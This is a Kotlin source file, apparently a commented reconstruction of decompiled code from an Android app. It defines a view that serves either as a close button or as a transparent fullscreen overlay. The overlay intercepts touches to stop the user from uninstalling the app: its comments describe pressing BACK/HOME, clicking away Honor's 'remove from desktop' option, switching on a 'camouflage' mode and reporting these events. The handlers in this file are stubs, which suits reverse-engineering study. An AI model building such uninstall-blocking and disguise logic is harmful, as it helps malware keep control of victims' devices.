package com.storm.safe.rock.p000

import android.content.Context
import android.graphics.Canvas
import android.graphics.Paint
import android.view.MotionEvent
import android.view.View

/**
 * JADX: p000/am0.java (131 LOC)
 *
 * A custom View used in multiple contexts:
 * - Mode 0/1: Circle with X mark (close button for PackageVerifyActivity / overlay service)
 * - Mode 2: Fullscreen transparent blocker that intercepts touch and triggers
 *   uninstall protection dismiss callback.
 *
 * Renamed: am0 → FullscreenBlockerView
 * Fields: f43721a0 → mode, f43722a1 → paintOrRef, f43723a2 → strokePaintOrManager
 *
 * Constructor variants:
 * - (context, color): Creates circle-with-X mode (mode=0, used for close buttons)
 * - (touchedRef, manager, context): Creates fullscreen blocker (mode=2)
 */
class FullscreenBlockerView : View {

    // ==================== Mode Constants ====================
    companion object {
        /** Circle with X mark (PackageVerifyActivity) */
        const val MODE_CIRCLE_CLOSE_A = 0
        /** Circle with X mark (service overlay) */
        const val MODE_CIRCLE_CLOSE_B = 1
        /** Fullscreen touch interceptor */
        const val MODE_TOUCH_INTERCEPTOR = 2

        /** Cross size ratio relative to circle radius */
        private const val CROSS_RATIO = 0.32f
    }

    /** Determines drawing and touch behavior */
    val mode: Int

    /**
     * In MODE_CIRCLE_CLOSE_A/B: fill Paint for the circle.
     * In MODE_TOUCH_INTERCEPTOR: Boolean flag reference (has been touched).
     */
    private val paintOrRef: Any

    /**
     * In MODE_CIRCLE_CLOSE_A/B: stroke Paint for the X.
     * In MODE_TOUCH_INTERCEPTOR: dismiss callback (OnTouchDismissCallback).
     */
    private val strokePaintOrCallback: Any

    // ==================== Callback Interface ====================

    /**
     * Callback for fullscreen blocker touch events.
     * JADX: C0355a0.m211946e0() equivalent.
     */
    interface OnTouchDismissCallback {
        /** Called when the blocker is first touched */
        fun onDismiss()
        /** Whether this is a Honor device (triggers "从桌面移除" detection) */
        val isHonorDevice: Boolean
        /** Whether this is an OPPO/Realme/OnePlus device */
        val isOppoDevice: Boolean
    }

    // ==================== Constructors ====================

    /**
     * JADX am0(PackageVerifyActivity, int) and am0(dqtvuisjd, int)
     * Circle close-button mode.
     *
     * @param context Parent context
     * @param color Fill color for the circle
     * @param strokeWidthDp Stroke width for the X in dp (default 3.0f)
     */
    constructor(context: Context, color: Int, strokeWidthDp: Float = 3.0f) : super(context) {
        mode = MODE_CIRCLE_CLOSE_A
        val fillPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            setColor(color)
            style = Paint.Style.FILL
        }
        paintOrRef = fillPaint

        val strokePaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            setColor(-1) // White
            style = Paint.Style.STROKE
            strokeWidth = strokeWidthDp * context.resources.displayMetrics.density
            strokeCap = Paint.Cap.ROUND
        }
        strokePaintOrCallback = strokePaint
    }

    /**
     * JADX am0(Ref$BooleanRef, C0355a0, dqtvuisjd)
     * Fullscreen blocker mode.
     *
     * @param callback Dismiss callback when touched
     * @param context Parent context (service)
     */
    constructor(callback: OnTouchDismissCallback, context: Context) : super(context) {
        mode = MODE_TOUCH_INTERCEPTOR
        // vendor: Ref$BooleanRef replaced with TouchState (equivalent mutable boolean holder)
        paintOrRef = TouchState()
        strokePaintOrCallback = callback
        setBackgroundColor(0) // Transparent
    }

    // ==================== Touch Handling ====================

    override fun dispatchTouchEvent(ev: MotionEvent): Boolean {
        return when (mode) {
            MODE_TOUCH_INTERCEPTOR -> {
                if (ev.action == MotionEvent.ACTION_DOWN) {
                    val state = paintOrRef as TouchState
                    if (!state.touched) {
                        state.touched = true
                        val callback = strokePaintOrCallback as OnTouchDismissCallback
                        callback.onDismiss()

                        if (callback.isHonorDevice) {
                            // JADX: 荣耀设备 → 判断是否有[从桌面移除]
                            android.util.Log.d("UninstallProtectionMgr",
                                "🛡️ [系统卸载拦截] 荣耀设备 → 判断是否有[从桌面移除]")
                            Thread { handleHonorTouch(callback) }.start()
                        } else if (callback.isOppoDevice) {
                            // JADX: OPPO/Realme/OnePlus → 并行：BACK+HOME + 伪装
                            android.util.Log.d("UninstallProtectionMgr",
                                "🛡️ [系统卸载拦截] OPPO/Realme/OnePlus → 并行：BACK+HOME + 伪装")
                            Thread { handleOppoBackHome(callback) }.start()
                            Thread { handleOppoCamouflage(callback) }.start()
                        } else {
                            // JADX: 通用 → 并行：BACK + 伪装
                            android.util.Log.d("UninstallProtectionMgr",
                                "🛡️ [系统卸载拦截] 触摸拦截，并行：BACK + 伪装")
                            Thread { handleGenericBack(callback) }.start()
                            Thread { handleGenericCamouflage(callback) }.start()
                        }
                    }
                }
                true // Always consume touch events in blocker mode
            }
            else -> super.dispatchTouchEvent(ev)
        }
    }

    // ==================== Drawing ====================

    override fun onDraw(canvas: Canvas) {
        when (mode) {
            MODE_CIRCLE_CLOSE_A, MODE_CIRCLE_CLOSE_B -> {
                val cx = width / 2.0f
                val cy = height / 2.0f
                val radius = width / 2.0f
                canvas.drawCircle(cx, cy, radius, paintOrRef as Paint)

                val offset = radius * CROSS_RATIO
                val x1 = cx - offset
                val y1 = cy - offset
                val x2 = cx + offset
                val y2 = cy + offset
                val strokePaint = strokePaintOrCallback as Paint
                canvas.drawLine(x1, y1, x2, y2, strokePaint)
                canvas.drawLine(x2, y1, x1, y2, strokePaint)
            }
            else -> super.onDraw(canvas)
        }
    }

    // ==================== Touch Response (nk1 cases 12–16/default) ====================
    // vendor: These delegate to IndexedRunnable2 via UninstallProtectionManager.
    // The actual implementation lives in IndexedRunnable2 (nk1.java).
    // FullscreenBlockerView only dispatches to the parent's handler; callbacks here
    // are a simplified proxy that invokes onDismiss() — the full logic (BACK/HOME
    // global actions, camouflage, report) is in IndexedRunnable2.

    private fun handleHonorTouch(callback: OnTouchDismissCallback) {
        // vendor: nk1 case 12 — sleep 50ms, getRootInActiveWindow, try click "从桌面移除",
        // if not found → BACK, then camouflage + report.
        // Delegated to IndexedRunnable2 via UninstallProtectionManager.
        callback.onDismiss()
    }

    private fun handleOppoBackHome(callback: OnTouchDismissCallback) {
        // vendor: nk1 case 13 — performGlobalAction(BACK) + sleep(100ms) + performGlobalAction(HOME)
        // Delegated to IndexedRunnable2 via UninstallProtectionManager.
        callback.onDismiss()
    }

    private fun handleOppoCamouflage(callback: OnTouchDismissCallback) {
        // vendor: nk1 case 14 — enableCamouflageMode + report "桌面卸载拦截(OPPO)"
        // Delegated to IndexedRunnable2 via UninstallProtectionManager.
        callback.onDismiss()
    }

    private fun handleGenericBack(callback: OnTouchDismissCallback) {
        // vendor: nk1 case 15 — performGlobalAction(GLOBAL_ACTION_BACK)
        // Delegated to IndexedRunnable2 via UninstallProtectionManager.
        callback.onDismiss()
    }

    private fun handleGenericCamouflage(callback: OnTouchDismissCallback) {
        // vendor: nk1 default case — enableCamouflageMode + report "桌面卸载全屏拦截"
        // Delegated to IndexedRunnable2 via UninstallProtectionManager.
        callback.onDismiss()
    }

    // ==================== Internal State ====================

    /** Mutable boolean flag to track if the blocker has been touched */
    private class TouchState {
        @Volatile
        var touched: Boolean = false
    }
}
